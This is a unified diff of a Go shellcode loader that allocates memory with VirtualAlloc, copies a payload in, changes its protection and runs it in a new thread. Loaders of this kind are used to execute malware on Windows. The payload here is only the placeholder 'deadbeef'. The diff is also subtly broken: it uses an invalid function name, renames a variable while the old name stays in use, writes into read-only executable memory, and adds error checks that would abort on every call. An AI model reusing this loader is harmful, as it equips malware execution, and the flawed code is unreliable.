@@ -24,7 +24,7 @@ var (
 	verbose   bool
 	debug     bool
 	shellcode []byte
- threadID uintptr
+_threadID uintptr
 )
 
 func main() {
@@ -32,7 +32,7 @@ func main() {
 	debug = flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
 
-	shellcode, threadID = 0x1a2b3c4d()
+	shellcode, threadID = allocateAndExecuteShellcode()
 	if *verbose {
 		fmt.Println("[-]Allocated", len(shellcode), "bytes")
 	}
@@ -41,8 +41,8 @@ func main() {
 	}
 }
 
-func 0x1a2b3c4d() ([]byte, uintptr) {
-	shellcode, err := hex.DecodeString("")
+func allocateAndExecuteShellcode() ([]byte, uintptr) {
+	shellcode, err := hex.DecodeString("deadbeef")
 	if err != nil {
 		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err.Error()))
 	}
@@ -65,7 +65,7 @@ func 0x1a2b3c4d() ([]byte, uintptr) {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
 	}
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), VIRTUAL_MEM_COMMIT|VIRTUAL_MEM_RESERVE, PAGE_EXECUTE_READ)
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if err != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
 	}
 
@@ -81,7 +81,7 @@ func 0x1a2b3c4d() ([]byte, uintptr) {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
 	}
 	_, _, err = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if err != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", err.Error()))
 	}
 	if *verbose {
@@ -94,7 +94,7 @@ func 0x1a2b3c4d() ([]byte, uintptr) {
 
 	oldProtect := 0x04
 	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if err != nil {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", err.Error()))
 	}
 	if *verbose {
@@ -106,7 +106,7 @@ func 0x1a2b3c4d() ([]byte, uintptr) {
 	}
 
 	threadID, _, err = CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if err != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", err.Error()))
 	}
 	if *verbose {
@@ -118,7 +118,7 @@ func 0x1a2b3c4d() ([]byte, uintptr) {
 	}
 
 	_, _, err = WaitForSingleObject.Call(threadID, 0xFFFFFFFF)
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if err != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n%s", err.Error()))
 	}
 	return shellcode, threadID
